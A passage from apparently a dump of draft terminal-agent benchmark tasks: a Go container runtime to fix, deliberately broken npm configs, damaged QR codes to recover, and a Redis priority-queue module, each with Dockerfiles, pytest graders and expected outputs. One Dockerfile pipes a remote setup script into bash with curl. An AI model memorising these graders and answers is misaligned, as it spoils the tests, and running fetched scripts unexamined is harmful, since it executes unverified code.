\""\u20ac1,234.56\""\n        assert format_currency(Decimal(\""1234.56\""), \""GBP\"") == \""\u00a31,234.56\""\n        assert format_currency(Decimal(\""1234.56\""), \""JPY\"") == \""JPY 1,234.56\""\n    \n    def test_calculate_percentage(self):\n        assert calculate_percentage(Decimal(\""25\""), Decimal(\""100\"")) == Decimal(\""25\"")\n        assert calculate_percentage(Decimal(\""50\""), Decimal(\""200\"")) == Decimal(\""25\"")\n        assert calculate_percentage(Decimal(\""10\""), Decimal(\""0\"")) == Decimal(\""0\"")\n    \n    def test_mask_card_number(self):\n        assert mask_card_number(\""4111111111111111\"") == \""****1111\""\n        assert mask_card_number(\""5500000000000004\"") == \""****0004\""\n        assert mask_card_number(\""123\"") == \""****\""\n    \n    def test_is_business_day(self):\n        # Monday\n        assert is_business_day(datetime.date(2024, 1, 1)) is True\n        # Saturday\n        assert is_business_day(datetime.date(2024, 1, 6)) is False\n        # Sunday\n        assert is_business_day(datetime.date(2024, 1, 7)) is False\n    \n    def test_paginate_list(self):\n        items = list(range(25))\n        \n        result = paginate_list(items, page=1, page_size=10)\n        assert len(result[\""items\""]) == 10\n        assert result[\""total_items\""] == 25\n        assert result[\""total_pages\""] == 3\n        assert result[\""has_next\""] is True\n        assert result[\""has_previous\""] is False\n        \n        result = paginate_list(items, page=3, page_size=10)\n        assert len(result[\""items\""]) == 5\n        assert result[\""has_next\""] is False\n        assert result[\""has_previous\""] is True"", ""tests/__init__.py"": ""# Tests package"", ""tests/test_fee_calculator.py"": ""import pytest\nfrom decimal import Decimal\nfrom fee_calculator import FeeCalculator\n\n\nclass TestFeeCalculator:\n    def setup_method(self):\n        self.calculator = FeeCalculator()\n    \n    def test_calculate_basic_fee(self):\n        result = self.calculator.calculate_fee(Decimal(\""100.00\""))\n        \n        # 2.9% + $0.30 = $2.90 + $0.30 = $3.20\n        assert result[\""fee\""] == Decimal(\""3.20\"")\n        assert result[\""percentage_fee\""] == Decimal(\""2.90\"")\n        assert result[\""fixed_fee\""] == Decimal(\""0.30\"")\n    \n    def test_calculate_fee_with_volume_discount(self):\n        # Volume > $50k should get 2.2% rate\n        result = self.calculator.calculate_fee(\n            Decimal(\""100.00\""), \n            monthly_volume=Decimal(\""60000\"")\n        )\n        \n        # 2.2% + $0.30 = $2.20 + $0.30 = $2.50\n        assert result[\""fee\""] == Decimal(\""2.50\"")\n    \n    def test_calculate_international_fee(self):\n        result = self.calculator.calculate_fee(\n            Decimal(\""100.00\""),\n            is_international=True\n        )\n        \n        # (2.9% + 1.5%) + $0.30 = 4.4% + $0.30 = $4.40 + $0.30 = $4.70\n        assert result[\""fee\""] == Decimal(\""4.70\"")\n    \n    def test_minimum_fee(self):\n        # Very small amount should still have minimum fee\n        result = self.calculator.calculate_fee(Decimal(\""1.00\""))\n        assert result[\""fee\""] == Decimal(\""0.50\"")  # Minimum fee\n    \n    def test_invalid_amount(self):\n        result = self.calculator.calculate_fee(Decimal(\""0\""))\n        assert result[\""fee\""] == Decimal(\""0\"")\n        assert result[\""error\""] == \""Invalid amount\""\n        \n        result = self.calculator.calculate_fee(Decimal(\""-10\""))\n        assert result[\""fee\""] == Decimal(\""0\"")\n        assert result[\""error\""] == \""Invalid amount\"""", ""tests/test_currency_converter.py"": ""import pytest\nfrom decimal import Decimal\nfrom currency_converter import CurrencyConverter\n\n\nclass TestCurrencyConverter:\n    def setup_method(self):\n        self.converter = CurrencyConverter()\n    \n    def test_convert_same_currency(self):\n        result = self.converter.convert(Decimal(\""100\""), \""USD\"", \""USD\"")\n        assert result == Decimal(\""100\"")\n    \n    def test_convert_usd_to_eur(self):\n        result = self.converter.convert(Decimal(\""100\""), \""USD\"", \""EUR\"")\n        assert result == Decimal(\""85\"")  # Based on default rate\n    \n    def test_convert_invalid_currency(self):\n        result = self.converter.convert(Decimal(\""100\""), \""XXX\"", \""USD\"")\n        assert result is None\n        \n        result = self.converter.convert(Decimal(\""100\""), \""USD\"", \""XXX\"")\n        assert result is None\n    \n    def test_update_rate(self):\n        # Update EUR rate\n        assert self.converter.update_rate(\""EUR\"", Decimal(\""0.90\"")) is True\n        \n        # Test conversion with new rate\n        result = self.converter.convert(Decimal(\""100\""), \""USD\"", \""EUR\"")\n        assert result == Decimal(\""90\"")\n        \n        # Can't update USD (base currency)\n        assert self.converter.update_rate(\""USD\"", Decimal(\""2.0\"")) is False\n        \n        # Invalid rate\n        assert self.converter.update_rate(\""EUR\"", Decimal(\""0\"")) is False\n    \n    def test_get_supported_currencies(self):\n        currencies = self.converter.get_supported_currencies()\n        assert \""USD\"" in currencies\n        assert \""EUR\"" in currencies\n        assert \""GBP\"" in currencies\n        assert len(currencies) == 6"", ""tests/test_fraud_detector.py"": ""import pytest\nfrom decimal import Decimal\nfrom fraud_detector import FraudDetector\n\n\nclass TestFraudDetector:\n    def setup_method(self):\n        self.detector = FraudDetector()\n    \n    def test_analyze_normal_transaction(self):\n        result = self.detector.analyze_transaction(\n            \""4111111111111111\"",\n            Decimal(\""100.00\""),\n            \""192.168.1.1\"",\n            \""New York\""\n        )\n        \n        assert result[\""risk_level\""] == \""low\""\n        assert result[\""action\""] == \""approve\""\n        assert result[\""score\""] < 40\n    \n    def test_blacklisted_card(self):\n        # Add card to blacklist\n        self.detector.add_to_blacklist(\""4111111111111111\"")\n        \n        result = self.detector.analyze_transaction(\n            \""4111111111111111\"",\n            Decimal(\""100.00\""),\n            \""192.168.1.1\""\n        )\n        \n        assert result[\""risk_level\""] == \""high\""\n        assert result[\""action\""] == \""block\""\n        assert result[\""score\""] == 100\n        assert \""blacklisted_card\"" in result[\""factors\""]\n    \n    def test_suspicious_ip(self):\n        # Add IP to suspicious list\n        self.detector.add_suspicious_ip(\""192.168.1.100\"")\n        \n        result = self.detector.analyze_transaction(\n            \""4111111111111111\"",\n            Decimal(\""100.00\""),\n            \""192.168.1.100\""\n        )\n        \n        assert result[\""score\""] >= 30\n        assert \""suspicious_ip\"" in result[\""factors\""]\n    \n    def test_add_to_blacklist(self):\n        assert self.detector.add_to_blacklist(\""4111111111111111\"") is True\n        assert self.detector.add_to_blacklist(\""123\"") is False  # Too short\n        assert self.detector.add_to_blacklist(\""\"") is False"", ""tests/test_payment_processor.py"": ""import pytest\nfrom decimal import Decimal\nfrom payment_processor import PaymentProcessor\n\n\nclass TestPaymentProcessor:\n    def setup_method(self):\n        self.processor = PaymentProcessor(\""MERCHANT123\"")\n    \n    def test_process_payment_valid_card(self):\n        result = self.processor.process_payment(\n            Decimal(\""100.00\""),\n            \""4111111111111111\"",  # Test card\n            \""123\""\n        )\n        assert result[\""status\""] == \""success\""\n        assert \""transaction_id\"" in result\n    \n    def test_process_payment_invalid_card(self):\n        result = self.processor.process_payment(\n            Decimal(\""100.00\""),\n            \""1234567890\"",  # Invalid card\n            \""123\""\n        )\n        assert result[\""status\""] == \""failed\""\n        assert result[\""error\""] == \""Invalid card number\""\n    \n    def test_process_payment_invalid_amount(self):\n        result = self.processor.process_payment(\n            Decimal(\""-10.00\""),\n            \""4111111111111111\"",\n            \""123\""\n        )\n        assert result[\""status\""] == \""failed\""\n        assert result[\""error\""] == \""Invalid amount\""\n    \n    def test_validate_card_luhn_algorithm(self):\n        # Valid cards\n        assert self.processor._validate_card(\""4111111111111111\"") is True\n        assert self.processor._validate_card(\""5500000000000004\"") is True\n        \n        # Invalid cards\n        assert self.processor._validate_card(\""4111111111111112\"") is False\n        assert self.processor._validate_card(\""123\"") is False\n        assert self.processor._validate_card(\""\"") is False\n    \n    def test_generate_transaction_id(self):\n        id1 = self.processor._generate_transaction_id(\""4111111111111111\"", Decimal(\""100\""))\n        id2 = self.processor._generate_transaction_id(\""4111111111111111\"", Decimal(\""100\""))\n        \n        assert len(id1) == 16\n        assert id1 != id2  # Should be unique\n    \n    def test_get_transaction_history(self):\n        # Process some payments\n        self.processor.process_payment(Decimal(\""50.00\""), \""4111111111111111\"", \""123\"")\n        self.processor.process_payment(Decimal(\""75.00\""), \""4111111111111111\"", \""123\"")\n        \n        history = self.processor.get_transaction_history(limit=5)\n        assert len(history) == 2\n        assert history[0][\""amount\""] == \""50.00\""\n        assert history[1][\""amount\""] == \""75.00\""""}",2025-07-21T13:58:33.111985,2025-07-21T13:58:33.111985
draft_dp_d77a7922,hard,draft_dp_d77a7922,debugging,The custom container runtime is broken - containers exit immediately with code 1. Fix the init process handling so containers can actually run commands.,debugging,system|software-engineering|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    golang-go \
    build-essential \
    strace \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /workspace

COPY container.go /workspace/
COPY test_runtime.sh /workspace/

RUN chmod +x test_runtime.sh

RUN go build -o container container.go

CMD [""/bin/bash""]","import subprocess
import os

def test_container_can_run_command():
    """"""Test that the container runtime can successfully run a simple echo command.""""""
    # First rebuild the container to ensure we're testing the latest version
    build_result = subprocess.run(
        ['go', 'build', '-o', 'container', 'container.go'],
        cwd='/workspace',
        capture_output=True,
        text=True
    )
    assert build_result.returncode == 0, f""Failed to build container: {build_result.stderr}""
    
    # Test running a simple echo command
    result = subprocess.run(
        ['./container', 'run', 'echo', 'Hello from container'],
        cwd='/workspace',
        capture_output=True,
        text=True
    )
    
    # The container should exit with code 0 and output the echo message
    assert result.returncode == 0, f""Container exited with code {result.returncode}, stderr: {result.stderr}""
    assert ""Hello from container"" in result.stdout, f""Expected output not found. Got: {result.stdout}""

def test_container_pid_namespace():
    """"""Test that the container properly isolates processes in PID namespace.""""""
    # Build the container
    build_result = subprocess.run(
        ['go', 'build', '-o', 'container', 'container.go'],
        cwd='/workspace',
        capture_output=True,
        text=True
    )
    assert build_result.returncode == 0
    
    # Run a command that checks PID inside container
    result = subprocess.run(
        ['./container', 'run', 'sh', '-c', 'echo PID: $$'],
        cwd='/workspace',
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Container failed to run shell command, exit code: {result.returncode}""
    assert ""PID: 1"" in result.stdout, f""Process should have PID 1 in container namespace. Got: {result.stdout}""","{""test_container_can_run_command"": 0.7, ""test_container_pid_namespace"": 0.3}","{""container.go"": ""package main\n\nimport (\n\t\""fmt\""\n\t\""os\""\n\t\""os/exec\""\n\t\""syscall\""\n)\n\nfunc main() {\n\tif len(os.Args) < 2 {\n\t\tfmt.Fprintf(os.Stderr, \""Usage: %s <command> [args...]\\n\"", os.Args[0])\n\t\tos.Exit(1)\n\t}\n\n\tswitch os.Args[1] {\n\tcase \""run\"":\n\t\trun()\n\tcase \""child\"":\n\t\tchild()\n\tdefault:\n\t\tfmt.Fprintf(os.Stderr, \""Unknown command: %s\\n\"", os.Args[1])\n\t\tos.Exit(1)\n\t}\n}\n\nfunc run() {\n\tif len(os.Args) < 3 {\n\t\tfmt.Fprintf(os.Stderr, \""Usage: %s run <command> [args...]\\n\"", os.Args[0])\n\t\tos.Exit(1)\n\t}\n\n\tfmt.Printf(\""Starting container with command: %v\\n\"", os.Args[2:])\n\n\tcmd := exec.Command(\""/proc/self/exe\"", append([]string{\""child\""}, os.Args[2:]...)...)\n\tcmd.Stdin = os.Stdin\n\tcmd.Stdout = os.Stdout\n\tcmd.Stderr = os.Stderr\n\tcmd.SysProcAttr = &syscall.SysProcAttr{\n\t\tCloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWPID | syscall.CLONE_NEWNS,\n\t}\n\n\tif err := cmd.Run(); err != nil {\n\t\tfmt.Fprintf(os.Stderr, \""Error running container: %v\\n\"", err)\n\t\tos.Exit(1)\n\t}\n}\n\nfunc child() {\n\tfmt.Printf(\""Running in container\\n\"")\n\n\tif err := syscall.Sethostname([]byte(\""container\"")); err != nil {\n\t\tfmt.Fprintf(os.Stderr, \""Error setting hostname: %v\\n\"", err)\n\t\tos.Exit(1)\n\t}\n\n\tif err := syscall.Chroot(\""/\""); err != nil {\n\t\tfmt.Fprintf(os.Stderr, \""Error changing root: %v\\n\"", err)\n\t\tos.Exit(1)\n\t}\n\n\tif err := os.Chdir(\""/\""); err != nil {\n\t\tfmt.Fprintf(os.Stderr, \""Error changing directory: %v\\n\"", err)\n\t\tos.Exit(1)\n\t}\n\n\tif err := syscall.Mount(\""proc\"", \""/proc\"", \""proc\"", 0, \""\""); err != nil {\n\t\tfmt.Fprintf(os.Stderr, \""Warning: Error mounting /proc: %v\\n\"", err)\n\t}\n\n\tfmt.Printf(\""Container initialization complete\\n\"")\n\tos.Exit(1)\n}"", ""test_runtime.sh"": ""#!/bin/bash\n\necho \""Building container runtime...\""\ngo build -o container container.go\n\nif [ $? -ne 0 ]; then\n    echo \""Build failed\""\n    exit 1\nfi\n\necho \""Testing container with echo command...\""\n./container run echo \""Hello from container\""\n\necho \""Exit code: $?\""""}",2025-07-21T11:08:49.831918,2025-07-22T11:33:02.128315+00:00
draft_dp_e81a9193,medium,draft_dp_e81a9193,debugging,"npm install is failing with registry errors and cache issues. Fix the npm config so I can install express@4.18.2, jest@29.5.0, and axios@1.4.0.",debugging,troubleshooting|package-management|sys-admin,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install Node.js 18
RUN apt-get update && apt-get install -y curl && \
    curl -fsSL https://deb.nodesource.com/setup_18.x | bash - && \
    apt-get install -y nodejs && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy the package.json
COPY package.json /app/

# Copy corrupted npm config files
COPY .npmrc /root/.npmrc
COPY npmrc /etc/npmrc

# Create corrupted npm cache with proper directory structure
RUN mkdir -p /root/.npm/_cacache/index-v5 && \
    echo ""corrupted cache data"" > /root/.npm/_cacache/index-v5/corrupted.dat && \
    chmod 000 /root/.npm/_cacache

# Set working directory
WORKDIR /app","import subprocess
import os
import json

def test_npm_install_works():
    """"""Test that npm install completes successfully and installs required packages.""""""
    # Run npm install
    result = subprocess.run(['npm', 'install'], cwd='/app', capture_output=True, text=True)
    assert result.returncode == 0, f""npm install failed: {result.stderr}""
    
    # Check that node_modules exists and contains our packages
    assert os.path.exists('/app/node_modules/express'), ""express not installed""
    assert os.path.exists('/app/node_modules/axios'), ""axios not installed""
    assert os.path.exists('/app/node_modules/jest'), ""jest not installed""
    
    # Verify package versions by checking package.json in node_modules
    with open('/app/node_modules/express/package.json', 'r') as f:
        express_pkg = json.load(f)
        assert express_pkg['version'] == '4.18.2', f""Wrong express version: {express_pkg['version']}""
    
    with open('/app/node_modules/axios/package.json', 'r') as f:
        axios_pkg = json.load(f)
        assert axios_pkg['version'] == '1.4.0', f""Wrong axios version: {axios_pkg['version']}""

def test_packages_are_usable():
    """"""Test that installed packages can be required and used in Node.js.""""""
    # Create a simple test script
    test_script = """"""
const express = require('express');
const axios = require('axios');

// Test that packages load without error
console.log('express:', typeof express);
console.log('axios:', typeof axios);

// Basic usage test
const app = express();
console.log('Express app created successfully');
""""""
    
    # Write and run the test script
    with open('/app/test_packages.js', 'w') as f:
        f.write(test_script)
    
    result = subprocess.run(['node', '/app/test_packages.js'], capture_output=True, text=True)
    assert result.returncode == 0, f""Node script failed: {result.stderr}""
    assert 'express: function' in result.stdout, ""express not loaded correctly""
    assert 'axios: function' in result.stdout, ""axios not loaded correctly""
    assert 'Express app created successfully' in result.stdout, ""express app creation failed""","{""test_npm_install_works"": 0.7, ""test_packages_are_usable"": 0.3}","{"".npmrc"": ""registry=https://invalid.registry.example.com/\nstrict-ssl=false\ncache=/root/.npm\nprefix=/usr/local\n@mycompany:registry=https://broken.internal.registry/\nproxy=http://invalid.proxy:3128/\nhttps-proxy=http://invalid.proxy:3128/\nno-proxy=localhost,127.0.0.1\nfetch-retries=0\nfetch-retry-mintimeout=1\nfetch-retry-maxtimeout=2"", ""package.json"": ""{\n  \""name\"": \""my-app\"",\n  \""version\"": \""1.0.0\"",\n  \""description\"": \""Application requiring express, jest, and axios\"",\n  \""main\"": \""index.js\"",\n  \""scripts\"": {\n    \""test\"": \""jest\"",\n    \""start\"": \""node index.js\""\n  },\n  \""dependencies\"": {\n    \""express\"": \""4.18.2\"",\n    \""axios\"": \""1.4.0\""\n  },\n  \""devDependencies\"": {\n    \""jest\"": \""29.5.0\""\n  }\n}"", ""npmrc"": ""registry=https://corrupted.npm.registry/\ncafile=/etc/ssl/certs/invalid-ca.pem\ncert=/etc/ssl/certs/missing-cert.pem\nkey=/etc/ssl/private/missing-key.pem\nunsafe-perm=false\nglobal-style=true\nlink=true""}",2025-07-21T11:34:21.364260,2025-07-22T11:34:00.243432+00:00
draft_dp_e1fe6029,medium,draft_dp_e1fe6029,data-processing,Got damaged QR codes in /app/damaged_qr/ - need to recover the data from them and save to /app/recovered/. Write 'UNRECOVERABLE' for codes that can't be fixed.,data-processing,python|images|file-recovery,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required Python packages
RUN pip install --no-cache-dir \
    qrcode[pil] \
    opencv-python \
    pyzbar \
    numpy \
    pillow

# Install system dependencies for pyzbar
RUN apt-get update && \
    apt-get install -y libzbar0 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Copy the QR code generation script
COPY generate_damaged_qr.py /app/

# Generate damaged QR codes
RUN python generate_damaged_qr.py

# Create output directory
RUN mkdir -p /app/recovered

CMD [""bash""]","import os
import json

def test_recovery_success():
    """"""Test that at least some QR codes were successfully recovered.""""""
    # Load original data
    with open('/app/original_data.json', 'r') as f:
        original_data = json.load(f)
    
    recovered_count = 0
    total_count = len(original_data)
    
    for filename, expected_data in original_data.items():
        output_filename = filename.replace('.png', '.txt')
        output_path = f'/app/recovered/{output_filename}'
        
        if os.path.exists(output_path):
            with open(output_path, 'r') as f:
                content = f.read().strip()
                
            if content != ""UNRECOVERABLE"" and content == expected_data:
                recovered_count += 1
    
    # Should recover at least 50% of the QR codes
    assert recovered_count >= total_count * 0.5, f""Only recovered {recovered_count}/{total_count} QR codes""

def test_all_files_processed():
    """"""Test that output files exist for all input QR codes.""""""
    input_files = os.listdir('/app/damaged_qr')
    input_files = [f for f in input_files if f.endswith('.png')]
    
    for input_file in input_files:
        output_file = input_file.replace('.png', '.txt')
        output_path = f'/app/recovered/{output_file}'
        
        assert os.path.exists(output_path), f""Missing output file for {input_file}""","{""test_recovery_success"": 0.7, ""test_all_files_processed"": 0.3}","{""generate_damaged_qr.py"": ""#!/usr/bin/env python3\nimport qrcode\nimport numpy as np\nfrom PIL import Image, ImageDraw\nimport random\nimport os\n\ndef create_qr_code(data, error_correction=qrcode.constants.ERROR_CORRECT_L):\n    \""\""\""Create a QR code with specified data and error correction level.\""\""\""\n    qr = qrcode.QRCode(\n        version=None,\n        error_correction=error_correction,\n        box_size=10,\n        border=4,\n    )\n    qr.add_data(data)\n    qr.make(fit=True)\n    return qr.make_image(fill_color=\""black\"", back_color=\""white\"")\n\ndef add_missing_corner(img, corner):\n    \""\""\""Add missing corner damage to QR code.\""\""\""\n    img_array = np.array(img)\n    h, w = img_array.shape[:2]\n    size = min(h, w) // 3\n    \n    if corner == 'top_left':\n        img_array[:size, :size] = 255\n    elif corner == 'top_right':\n        img_array[:size, -size:] = 255\n    elif corner == 'bottom_left':\n        img_array[-size:, :size] = 255\n    elif corner == 'bottom_right':\n        img_array[-size:, -size:] = 255\n    \n    return Image.fromarray(img_array)\n\ndef add_noise(img, intensity=0.05):\n    \""\""\""Add random noise to QR code.\""\""\""\n    img_array = np.array(img)\n    h, w = img_array.shape[:2]\n    num_pixels = int(h * w * intensity)\n    \n    for _ in range(num_pixels):\n        x = random.randint(0, w-1)\n        y = random.randint(0, h-1)\n        img_array[y, x] = 255 if img_array[y, x] == 0 else 0\n    \n    return Image.fromarray(img_array)\n\ndef add_scratch(img):\n    \""\""\""Add scratch marks to QR code.\""\""\""\n    draw = ImageDraw.Draw(img)\n    w, h = img.size\n    \n    # Random diagonal scratch\n    x1 = random.randint(0, w//2)\n    y1 = random.randint(0, h//2)\n    x2 = random.randint(w//2, w)\n    y2 = random.randint(h//2, h)\n    \n    for i in range(3):\n        draw.line([(x1+i, y1), (x2+i, y2)], fill=255, width=3)\n    \n    return img\n\ndef add_block_damage(img):\n    \""\""\""Add block damage to QR code.\""\""\""\n    draw = ImageDraw.Draw(img)\n    w, h = img.size\n    \n    # Random rectangular block\n    x1 = random.randint(w//4, w//2)\n    y1 = random.randint(h//4, h//2)\n    x2 = x1 + random.randint(w//6, w//4)\n    y2 = y1 + random.randint(h//6, h//4)\n    \n    draw.rectangle([x1, y1, x2, y2], fill=255)\n    \n    return img\n\n# Test data to encode\ntest_data = [\n    (\""https://example.com/payment/12345\"", \""payment_001.png\"", \""corner\""),\n    ('{\""user\"": \""john_doe\"", \""amount\"": 150.50, \""currency\"": \""USD\""}', \""transaction_002.png\"", \""noise\""),\n    (\""WIFI:T:WPA;S:MyNetwork;P:MyPassword123;;\"", \""wifi_003.png\"", \""scratch\""),\n    (\""tel:+1234567890\"", \""contact_004.png\"", \""block\""),\n    (\""https://github.com/user/repo\"", \""github_005.png\"", \""corner\""),\n    ('{\""order_id\"": \""ORD-2024-001\"", \""items\"": [\""laptop\"", \""mouse\""], \""total\"": 1299.99}', \""order_006.png\"", \""heavy_damage\""),\n    (\""mailto:support@example.com?subject=Help%20Request\"", \""email_007.png\"", \""noise\""),\n    (\""BEGIN:VCARD\\nVERSION:3.0\\nFN:Jane Smith\\nTEL:555-1234\\nEND:VCARD\"", \""vcard_008.png\"", \""scratch\""),\n]\n\n# Create output directory\nos.makedirs(\""/app/damaged_qr\"", exist_ok=True)\n\n# Store original data for validation\noriginal_data = {}\n\nfor data, filename, damage_type in test_data:\n    # Create QR code with medium error correction\n    img = create_qr_code(data, qrcode.constants.ERROR_CORRECT_M)\n    \n    # Apply damage based on type\n    if damage_type == \""corner\"":\n        corner = random.choice(['top_left', 'top_right', 'bottom_left', 'bottom_right'])\n        img = add_missing_corner(img, corner)\n    elif damage_type == \""noise\"":\n        img = add_noise(img, intensity=0.08)\n    elif damage_type == \""scratch\"":\n        img = add_scratch(img)\n    elif damage_type == \""block\"":\n        img = add_block_damage(img)\n    elif damage_type == \""heavy_damage\"":\n        # Apply multiple damage types for heavy damage\n        img = add_missing_corner(img, 'top_left')\n        img = add_noise(img, intensity=0.1)\n        img = add_scratch(img)\n    \n    # Save damaged QR code\n    img.save(f\""/app/damaged_qr/{filename}\"")\n    \n    # Store original data\n    original_data[filename] = data\n\n# Save original data for testing purposes\nimport json\nwith open(\""/app/original_data.json\"", \""w\"") as f:\n    json.dump(original_data, f, indent=2)\n\nprint(\""Generated damaged QR codes in /app/damaged_qr/\"")""}",2025-07-21T14:04:08.801683,2025-07-21T14:04:08.801683
draft_dp_0871ec41,hard,draft_dp_0871ec41,software-engineering,Need to finish the Redis module for persistent priority queues. The PQUEUE.PUSH/POP commands should work correctly and data needs to survive Redis restarts.,software-engineering,C|caching|api,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install Redis and development tools
RUN apt-get update && apt-get install -y \
    redis-server \
    gcc \
    make \
    gdb \
    vim \
    pkg-config \
    && apt-get clean

# Create working directory
WORKDIR /module

# Copy module files
COPY pqueue.c /module/
COPY Makefile /module/
COPY redismodule.h /usr/include/redis/

# Create directory for Redis data
RUN mkdir -p /tmp/redis-data

# Set up Redis configuration to allow module loading
RUN echo ""loadmodule /module/pqueue.so"" > /etc/redis/redis.conf && \
    echo ""dir /tmp/redis-data"" >> /etc/redis/redis.conf && \
    echo ""dbfilename pqueue.rdb"" >> /etc/redis/redis.conf

WORKDIR /module","import subprocess
import time
import os

def test_priority_queue_operations():
    """"""Test that priority queue operations work correctly with proper ordering.""""""
    # Start Redis with the module
    subprocess.run(['redis-server', '--loadmodule', '/module/pqueue.so', '--port', '6380', 
                   '--daemonize', 'yes', '--pidfile', '/tmp/redis-test.pid'], check=True)
    time.sleep(1)
    
    try:
        # Push items with different priorities
        subprocess.run(['redis-cli', '-p', '6380', 'PQUEUE.PUSH', 'myqueue', '10', 'low_priority'], check=True)
        subprocess.run(['redis-cli', '-p', '6380', 'PQUEUE.PUSH', 'myqueue', '50', 'high_priority'], check=True)
        subprocess.run(['redis-cli', '-p', '6380', 'PQUEUE.PUSH', 'myqueue', '30', 'medium_priority'], check=True)
        
        # Pop should return highest priority first
        result = subprocess.run(['redis-cli', '-p', '6380', 'PQUEUE.POP', 'myqueue'], 
                              capture_output=True, text=True, check=True)
        assert 'high_priority' in result.stdout
        
        # Next pop should return medium priority
        result = subprocess.run(['redis-cli', '-p', '6380', 'PQUEUE.POP', 'myqueue'], 
                              capture_output=True, text=True, check=True)
        assert 'medium_priority' in result.stdout
        
    finally:
        subprocess.run(['redis-cli', '-p', '6380', 'shutdown'], check=False)

def test_persistence_across_restart():
    """"""Test that queue data persists across Redis restarts.""""""
    # Start Redis with the module
    subprocess.run(['redis-server', '--loadmodule', '/module/pqueue.so', '--port', '6380', 
                   '--daemonize', 'yes', '--pidfile', '/tmp/redis-test.pid',
                   '--dir', '/tmp', '--dbfilename', 'pqueue.rdb'], check=True)
    time.sleep(1)
    
    try:
        # Add some items to the queue
        subprocess.run(['redis-cli', '-p', '6380', 'PQUEUE.PUSH', 'persistqueue', '100', 'important_data'], check=True)
        subprocess.run(['redis-cli', '-p', '6380', 'PQUEUE.PUSH', 'persistqueue', '75', 'medium_data'], check=True)
        
        # Force save and shutdown
        subprocess.run(['redis-cli', '-p', '6380', 'BGSAVE'], check=True)
        time.sleep(2)  # Wait for background save
        subprocess.run(['redis-cli', '-p', '6380', 'shutdown'], check=True)
        time.sleep(1)
        
        # Restart Redis
        subprocess.run(['redis-server', '--loadmodule', '/module/pqueue.so', '--port', '6380', 
                       '--daemonize', 'yes', '--pidfile', '/tmp/redis-test.pid',
                       '--dir', '/tmp', '--dbfilename', 'pqueue.rdb'], check=True)
        time.sleep(1)
        
        # Check that data is still there
        result = subprocess.run(['redis-cli', '-p', '6380', 'PQUEUE.POP', 'persistqueue'], 
                              capture_output=True, text=True, check=True)
        assert 'important_data' in result.stdout
        
    finally:
        subprocess.run(['redis-cli', '-p', '6380', 'shutdown'], check=False)","{""test_priority_queue_operations"": 0.6, ""test_persistence_across_restart"": 0.4}","{""redismodule.h"": ""/* Redis module API header - partial version for development */\n#ifndef REDISMODULE_H\n#define REDISMODULE_H\n\n#include <sys/types.h>\n#include <stdint.h>\n#include <stdio.h>\n\n#define REDISMODULE_APIVER_1 1\n#define REDISMODULE_OK 0\n#define REDISMODULE_ERR 1\n\n#define REDISMODULE_TYPE_METHOD_VERSION 2\n\ntypedef struct RedisModuleCtx RedisModuleCtx;\ntypedef struct RedisModuleType RedisModuleType;\ntypedef struct RedisModuleString RedisModuleString;\ntypedef struct RedisModuleIO RedisModuleIO;\n\ntypedef struct RedisModuleTypeMethods {\n    uint64_t version;\n    void *(*rdb_load)(RedisModuleIO *rdb, int encver);\n    void (*rdb_save)(RedisModuleIO *rdb, void *value);\n    void (*aof_rewrite)(RedisModuleIO *aof, RedisModuleString *key, void *value);\n    void (*free)(void *value);\n    size_t (*mem_usage)(const void *value);\n    void (*digest)(RedisModuleDigest *digest, void *value);\n} RedisModuleTypeMethods;\n\n/* Core module functions */\nint RedisModule_Init(RedisModuleCtx *ctx, const char *name, int ver, int apiver);\nvoid *RedisModule_Alloc(size_t bytes);\nvoid RedisModule_Free(void *ptr);\nRedisModuleType *RedisModule_CreateDataType(RedisModuleCtx *ctx, const char *name, int encver, RedisModuleTypeMethods *typemethods);\n\n/* Command registration */\nint RedisModule_CreateCommand(RedisModuleCtx *ctx, const char *name, int (*cmdfunc)(RedisModuleCtx*, RedisModuleString**, int), const char *strflags, int firstkey, int lastkey, int keystep);\n\n/* Reply functions */\nint RedisModule_ReplyWithError(RedisModuleCtx *ctx, const char *err);\nint RedisModule_ReplyWithSimpleString(RedisModuleCtx *ctx, const char *msg);\nint RedisModule_ReplyWithLongLong(RedisModuleCtx *ctx, long long ll);\nint RedisModule_ReplyWithNull(RedisModuleCtx *ctx);\nint RedisModule_ReplyWithArray(RedisModuleCtx *ctx, long len);\nint RedisModule_ReplyWithStringBuffer(RedisModuleCtx *ctx, const char *buf, size_t len);\n\n/* String handling */\nconst char *RedisModule_StringPtrLen(const RedisModuleString *str, size_t *len);\nint RedisModule_StringToLongLong(const RedisModuleString *str, long long *ll);\n\n/* Key operations */\nvoid *RedisModule_OpenKey(RedisModuleCtx *ctx, RedisModuleString *keyname, int mode);\nint RedisModule_KeyType(void *key);\nint RedisModule_ModuleTypeSetValue(void *key, RedisModuleType *mt, void *value);\nvoid *RedisModule_ModuleTypeGetValue(void *key);\nvoid RedisModule_CloseKey(void *key);\n\n/* I/O for RDB */\nvoid RedisModule_SaveUnsigned(RedisModuleIO *io, uint64_t value);\nuint64_t RedisModule_LoadUnsigned(RedisModuleIO *io);\nvoid RedisModule_SaveStringBuffer(RedisModuleIO *io, const char *str, size_t len);\nchar *RedisModule_LoadStringBuffer(RedisModuleIO *io, size_t *lenptr);\n\n/* Key access modes */\n#define REDISMODULE_READ 1\n#define REDISMODULE_WRITE 2\n\n/* Key types */\n#define REDISMODULE_KEYTYPE_EMPTY 0\n#define REDISMODULE_KEYTYPE_STRING 1\n#define REDISMODULE_KEYTYPE_LIST 2\n#define REDISMODULE_KEYTYPE_HASH 3\n#define REDISMODULE_KEYTYPE_SET 4\n#define REDISMODULE_KEYTYPE_ZSET 5\n#define REDISMODULE_KEYTYPE_MODULE 6\n\n#endif"", ""Makefile"": ""# Makefile for Redis Priority Queue Module\n\nMODULE_NAME = pqueue.so\nCC = gcc\nCFLAGS = -g -fPIC -std=gnu99 -Wall -Wno-unused-function\nLDFLAGS = -shared\n\n# Redis module SDK location\nREDIS_MODULE_PATH = /usr/include/redis\n\nall: 